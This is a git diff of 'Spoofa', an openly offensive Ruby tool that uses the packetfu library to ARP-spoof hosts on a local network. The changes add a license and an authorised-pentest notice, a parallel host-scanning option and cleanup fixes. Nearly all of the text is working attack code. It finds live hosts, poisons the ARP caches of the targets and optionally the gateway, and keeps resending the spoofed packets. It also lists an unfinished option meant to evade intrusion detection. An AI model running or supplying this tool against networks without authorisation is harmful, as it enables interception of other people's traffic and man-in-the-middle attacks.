@@ -1,8 +1,24 @@
 #!/usr/bin/env ruby
+=begin
 
 # SPOOFA - for ARP-spoofing local networks
 
-# (C) 2013 Vulpi Argenti (SilverFoxx)
+# (C) 2013 VulpiArgenti (SilverFoxx)
+
+This program is only for use during an authorised pentest, authorised 
+network maintenance, or for private research.
+
+This program is free software: you can redistribute it and/or modify
+it under the terms of the GNU General Public License as published by
+the Free Software Foundation, either version 3 of the License, or
+(at your option) any later version.
+This program is distributed in the hope that it will be useful,
+but WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+GNU General Public License for more details.
+You should have received a copy of the GNU General Public License
+along with this program.  If not, see <http://www.gnu.org/licenses/>.
+=end
 
 require 'packetfu'
 require 'optparse'
@@ -14,46 +30,48 @@ require 'ipaddr'
 if ARGV.empty?
   interactive = true
 else 
-begin
-  options = OpenStruct.new
-  optparse = OptionParser.new do |opts|
-    opts.banner = "Interactive mode:\tspoofa.rb\nCommand-line mode:\tspoofa.rb [-hmv] [-t target(s)] [-g gateway] -i interface"
-    opts.separator ""
-    opts.separator "Specific options:"
-
-    opts.on("-v", "--verbose", "Run verbosely") do |v|
-      options.verbose = v
-    end
-
-    opts.on("-m", "--smart", "[NOT WORKING YET] Smart ARPing; attempts various tricks to avoid IDS. If not set, ARP packets are sent continuously.") do |m|
-      options.smart = m
-    end
-
-    opts.on("-t", "--target <target IP>", "One or more targets separated by comma (no whitespace), and/or a hyphened range. E.g. \"-t 192.168.1.10,192.168.1.50-100\". If omitted, all live targets in the entire subnet will be spoofed. Without [-g], one-way spoofing is performed, i.e. packets *from* the target are intercepted.") do |target|
-      options.target = target
-    end
-
-    opts.on("-g", "--gateway <gateway IP>", "With [-t] set, performs two-way spoofing.") do |gateway|
-      options.gateway = gateway
-    end
-
-    opts.on("-i", "--interface <interface>", "Interface") do |interface|
-      options.interface = interface
-    end
-
-    opts.on("-h", "--help", "You're looking at it. If it's not good enough, try the README.md at https://github.com/SilverFoxx/Spoofa") do |h|
-      puts opts
-      exit 0
-    end
-  end
+  begin
+    options = OpenStruct.new
+    optparse = OptionParser.new do |opts|
+      opts.banner = "Interactive mode:\tspoofa.rb\nCommand-line mode:\tspoofa.rb [-hmpv] [-t target(s)] [-g gateway] -i interface"
+      opts.separator ""
+      opts.separator "Specific options:"
   
-  # Parse the command-line options
-  optparse.parse! 
-  raise OptionParser::MissingArgument if options.interface.nil? # Is there a better way of doing this?
-  raise OptionParser::InvalidOption if options.gateway && !options.target
-  rescue OptionParser::MissingArgument, OptionParser::InvalidOption => e
+      opts.on("-m", "--smart", "[NOT WORKING YET] Smart ARPing; attempts various tricks to avoid IDS. If not set, ARP packets are sent continuously.") do |m|
+        options.smart = m
+      end
+      
+      opts.on("-p", "--parallel", "Uses parallel/multi-threaded scanning. Slow without it; but unstable on some systems") do |p|
+        options.parallel = p
+      end
+      
+      opts.on("-v", "--verbose", "Run verbosely") do |v|
+        options.verbose = v
+      end            
+  
+      opts.on("-t", "--target <target IP>", "One or more targets separated by comma (no whitespace), and/or a hyphened range. E.g. \"-t 192.168.1.10,192.168.1.50-100\". If omitted, all live targets in the entire subnet will be spoofed. Without [-g], one-way spoofing is performed, i.e. packets *from* the target are intercepted.") do |target|
+        options.target = target
+      end
+  
+      opts.on("-g", "--gateway <gateway IP>", "Performs two-way spoofing.") do |gateway|
+        options.gateway = gateway
+      end
+  
+      opts.on("-i", "--interface <interface>", "Interface") do |interface|
+        options.interface = interface
+      end
+  
+      opts.on("-h", "--help", "You're looking at it. If it's not good enough, try the README.md at https://github.com/SilverFoxx/Spoofa") do |h|
+        puts opts
+        exit 0
+      end
+    end
+    
+    # Parse the command-line options
+    optparse.parse! 
+    raise OptionParser::MissingArgument if options.interface.nil? # Is there a better way of doing this?
+  rescue OptionParser::MissingArgument => e
     puts "\n!!! Interface required !!!\n\n" if e.message =~ /argument/
-    puts "\n!!! Need target if gateway set !!!\n\n" if e.message =~ /option/
     puts optparse
     exit 0
   end
@@ -64,9 +82,6 @@ end
 
 def ip_check(ip)
   true if ip =~ /^(192|10|172)((\.)(25[0-5]|2[0-4][0-9]|[1][0-9][0-9]|[1-9][0-9]|[0-9])){3}$/
-  rescue
-    puts "\n!!! Invalid IP #{ip} !!!"
-    neat_exit
 end
 
 def puts_verbose(text)
@@ -104,25 +119,24 @@ end
 # Broadcast packets don't always work, best to directly target live hosts
 def target_scanner(targets, timeout)
   puts_verbose("Looking for live targets...")
-  threads = []                                            # To keep track of the child processes/threads
-  hash_mutex = Mutex.new
-  thread_limit = 26
+  threads = []                                  # To keep track of the child processes/threads
+  mutex = Mutex.new
   targets.each do |ip|
-    until threads.map { |t| t.status }.count("run") < thread_limit do sleep 1.5 end # Sleeps when thread limit reached. TODO A more elegant method
+    #until threads.map { |t| t.status }.count("run") < thread_limit do sleep 1.5 end # Sleeps when thread limit reached.
     threads << Thread.new do
-      @iface = @defaults[:iface]                          # Necessary until I improve Mutexing TODO
-      @target_mac = PacketFu::Utils::arp(ip, :timeout => timeout, :iface => @iface)
-      hash_mutex.synchronize do                           # Mutex prevents mutiple threads writing to the hash at the same time
-        @targets_hash[ip] = @target_mac                   # Make hash of target ips => target macs
+      @targets_hash[ip] = PacketFu::Utils::arp(ip, :timeout => timeout, :iface => @iface)
+      mutex.synchronize do                      # Mutex prevents mutiple threads writing to the screen at the same time
+        if @targets_hash[ip]
+          print "\n#{ip} \tmac is #{@targets_hash[ip]}" if @verbose
+        elsif @verbose
+          print "."
+        end
       end
       GC.start
-      puts_verbose "#{ip} \tmac is #{@target_mac}" if @target_mac
     end
+    sleep 0.1 # Absolutely crucial
   end
-  # Join on the child processes to allow them to finish
-  # TODO Writing to hash should avoid need for this
-  threads.each { |thread| thread.join }
-  
+  threads.each { |thread| thread.join }          # Wait for all the child processes to finish
   @targets_hash.delete_if { |k, v| v.nil? }
   @targets_hash.delete(@gateway)
 end
@@ -131,17 +145,19 @@ def neat_exit
   puts "\nRe-ARPing the network..."
   send_packets = false
   re_arp_pkts = []
-  @targets_hash.each do |target, target_mac|
-    build_pkt(target_mac, @gateway, target, @gateway_mac)
-    re_arp_pkts << @arp_pkt
-    if @two_way
-      build_pkt(@gateway_mac, target, @gateway, target_mac)
+  unless @targets_hash.nil?
+    @targets_hash.each do |target, target_mac|
+      build_pkt(target_mac, @gateway, target, @gateway_mac)
       re_arp_pkts << @arp_pkt
+      if @two_way
+        build_pkt(@gateway_mac, target, @gateway, target_mac)
+        re_arp_pkts << @arp_pkt
+      end
     end
-  end
-  3.times do
-    re_arp_pkts.each { |pkt| pkt.to_w(@iface) }
-    sleep 1
+    3.times do
+      re_arp_pkts.each { |pkt| pkt.to_w(@iface) }
+      sleep 1
+    end
   end
   `echo 0 > /proc/sys/net/ipv4/ip_forward`
   puts "...done.\nExiting Spoofa"
@@ -154,6 +170,7 @@ end
 trap("INT") { neat_exit }
 
 if interactive
+  puts "Spoofa: for ARP-spoofing networks\n(C) 2013 VulpiArgenti (SilverFoxx)\n"
   @verbose = true
 
   @defaults = PacketFu::Utils.ifconfig(Pcap.lookupdev)
@@ -236,11 +253,12 @@ end
 puts "#{var1}poofing #{var3} on #{@iface}, #{var2}"
 
 #----------------------------------------------------------------------#
+# Run the script
 
 puts_verbose("\nLooking for gateway...")
-@gateway_mac = PacketFu::Utils::arp(@gateway, :iface => @iface)
+@gateway_mac = PacketFu::Utils::arp(@gateway, :timeout => 5, :iface => @iface)
 unless @gateway_mac 
-  (0..1).map { @gateway_mac = PacketFu::Utils::arp(@gateway, :iface => @iface) } # Try twice more, then exit.
+  (0..2).map { @gateway_mac = PacketFu::Utils::arp(@gateway, :timeout => 5, :iface => @iface) } # Try twice more, then exit.
   puts "Unable to determine gateway mac."
   sleep 2
   exit 0 
@@ -269,8 +287,8 @@ end
 send_packets = true
 while send_packets
   print "\nSending spoofing packets to"
-  @targets_hash.each { |target, | print "; #{target} " }
-  print "and gateway #{@gateway}" if @two_way
+  @targets_hash.each { |target, | print ": #{target}" }
+  print " and gateway #{@gateway}" if @two_way
   print "\nPackets sent: " if @verbose
   count = 0
   while true
@@ -286,6 +304,6 @@ while send_packets
     end
     GC.start   # to deal with "memory leak" (more likely a problem calling GC)
     print "#{count}; " if @verbose
-    sleep 2
+    sleep 4
   end
 end
